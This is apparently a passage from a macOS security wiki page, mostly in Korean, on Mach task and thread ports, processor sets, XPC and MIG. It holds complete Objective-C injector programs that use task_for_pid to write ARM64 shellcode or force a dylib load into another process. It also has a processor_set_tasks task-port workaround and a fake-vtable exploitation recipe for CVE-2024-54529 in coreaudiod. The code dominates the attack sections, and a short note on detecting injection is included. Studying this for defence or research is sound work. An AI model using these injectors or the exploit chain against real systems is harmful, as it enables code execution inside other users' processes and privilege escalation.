또한 task port는 **`vm_map`** port이기도 하므로, caller는 `vm_read()` 및 `vm_write()`와 같은 function을 사용하여 task 내부의 **memory를 읽고 조작**할 수 있습니다. 즉, 다른 task의 task port에 대한 SEND right를 가진 task는 해당 task에 **code를 inject**할 수 있습니다.

**kernel도 task**라는 점을 기억해야 합니다. 따라서 누군가 **`kernel_task`에 대한 SEND permissions**를 획득하면 kernel이 무엇이든 실행하도록 할 수 있습니다(jailbreak).

- `mach_task_self()`를 호출하여 caller task에 대한 이 port의 **name을 가져옵니다**. 이 port는 **`exec()`**를 통해서만 **상속**됩니다. `fork()`로 생성된 새 task는 새로운 task port를 가져옵니다(`exec()` 후 suid binary에서도 task가 새 task port를 가져오는 것은 특수한 경우입니다). task를 생성하면서 해당 task의 port를 얻는 유일한 방법은 `fork()`를 수행하는 동안 ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)를 실행하는 것입니다.
- port에 접근하기 위한 제한 사항은 다음과 같습니다(`AppleMobileFileIntegrity` binary의 `macos_task_policy`에서 확인할 수 있음).
- app에 **`com.apple.security.get-task-allow` entitlement**가 있으면 **동일한 user의** process가 task port에 접근할 수 있습니다(Xcode가 debugging을 위해 일반적으로 추가함). **notarization** process는 production release에 이 entitlement를 허용하지 않습니다.
- **`com.apple.system-task-ports`** entitlement가 있는 app은 kernel을 제외한 **모든** process의 **task port**를 가져올 수 있습니다. 이전 버전에서는 **`task_for_pid-allow`**라고 불렸습니다. 이 entitlement는 Apple application에만 부여됩니다.
- **Root**는 **hardened** runtime으로 compile되지 않은 application(Apple application이 아닌 경우)의 **task port에 접근할 수 있습니다**.

**The task name port:** 권한이 없는 버전의 _task port_입니다. task를 참조하지만 task를 제어할 수는 없습니다. 이를 통해 사용할 수 있는 것으로 보이는 유일한 기능은 `task_info()`입니다.

### Thread Ports

thread에도 연결된 port가 있으며, `task_threads`를 호출하는 task와 `processor_set_threads`를 사용하는 processor에서 확인할 수 있습니다. thread port에 대한 SEND right가 있으면 다음과 같이 `thread_act` subsystem의 function을 사용할 수 있습니다.

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

모든 thread는 **`mach_thread_sef`**를 호출하여 이 port를 가져올 수 있습니다.

### Shellcode Injection in thread via Task port

다음 위치에서 shellcode를 가져올 수 있습니다:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

이전 프로그램을 **컴파일**하고 동일한 사용자로 코드를 inject할 수 있도록 **entitlements**를 추가하세요(그렇지 않으면 **sudo**를 사용해야 합니다).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> iOS에서 이 작업이 동작하려면 쓰기 가능한 메모리를 실행 가능하게 만들 수 있도록 `dynamic-codesigning` entitlement가 필요합니다.

### Task port를 통한 thread 내 Dylib Injection

macOS에서 **threads**는 **Mach**를 통해 조작하거나 posix `pthread` api를 사용할 수 있습니다. 이전 injection에서 생성한 thread는 Mach api를 사용해 생성되었으므로 **posix compliant가 아닙니다**.

**posix compliant api**와 함께 동작할 필요가 없고 Mach만 사용하면 되었기 때문에 **simple shellcode를 inject**하여 명령을 실행할 수 있었습니다. **More complex injections**에서는 **thread**도 **posix compliant**여야 합니다.

따라서 **thread를 개선**하려면 **`pthread_create_from_mach_thread`**를 호출하여 **valid pthread를 생성**해야 합니다. 그러면 이 새로운 pthread가 **dlopen을 호출**하여 시스템에서 **dylib를 load**할 수 있으므로, 다양한 작업을 수행하기 위해 새로운 shellcode를 작성하는 대신 custom libraries를 load할 수 있습니다.<sup>[[2]](#references)</sup>

예를 들어 log를 생성한 후 해당 log를 listen할 수 있는 **example dylibs**를 다음에서 확인할 수 있습니다:


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 technique에서는 프로세스의 thread를 hijack합니다:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

`task_for_pid` 또는 `thread_create_*`를 호출하면 kernel의 `task` struct에 있는 counter가 증가하며, 이는 user mode에서 `task_info(task, TASK_EXTMOD_INFO, ...)`를 호출해 확인할 수 있습니다.

## Exception Ports

thread에서 exception이 발생하면 해당 exception은 thread에 지정된 exception port로 전송됩니다. thread가 이를 처리하지 않으면 task exception ports로 전송됩니다. task도 처리하지 않으면 launchd가 관리하는 host port로 전송되어 처리됩니다. 이를 exception triage라고 합니다.

일반적으로 마지막에는 report가 제대로 처리되지 않은 경우 ReportCrash daemon에 의해 처리됩니다. 그러나 같은 task의 다른 thread가 exception을 처리할 수도 있으며, `PLCreashReporter`와 같은 crash reporting tool이 바로 이 방식으로 동작합니다.

## Other Objects

### Clock

모든 user는 clock 정보에 접근할 수 있지만, 시간을 설정하거나 다른 설정을 수정하려면 root 권한이 필요합니다.

정보를 가져오려면 `clock_get_time`, `clock_get_attributtes` 또는 `clock_alarm`과 같은 함수를 `clock` subsystem에서 호출할 수 있습니다.\
값을 수정하려면 `clock_set_time` 및 `clock_set_attributes`와 같은 함수와 함께 `clock_priv` subsystem을 사용할 수 있습니다.

### Processors and Processor Set

processor API를 사용하면 `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`와 같은 함수를 통해 단일 logical processor를 제어할 수 있습니다.

또한 **processor set** API는 여러 processor를 하나의 group으로 묶는 방법을 제공합니다. **`processor_set_default`**를 호출하면 default processor set을 가져올 수 있습니다.\
다음은 processor set과 상호작용할 때 유용한 API입니다:

- `processor_set_statistics`
- `processor_set_tasks`: processor set 내부의 모든 task에 대한 send right 배열을 반환
- `processor_set_threads`: processor set 내부의 모든 thread에 대한 send right 배열을 반환
- `processor_set_stack_usage`
- `processor_set_info`

[**이 post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)에서 언급한 것처럼, 과거에는 **`processor_set_tasks`**를 호출하고 각 process에 대한 host port를 가져와 다른 process의 task port를 얻고 이를 제어함으로써 앞서 언급한 protection을 우회할 수 있었습니다.<sup>[[10]](#references)</sup>\
현재는 해당 function을 사용하려면 root 권한이 필요하며 protection이 적용되어 있으므로, 보호되지 않은 process에서만 이러한 port를 가져올 수 있습니다.<sup>[[10]](#references)</sup>

다음과 같이 실행해 볼 수 있습니다:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; vtable 슬롯을 통한 간접 호출
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
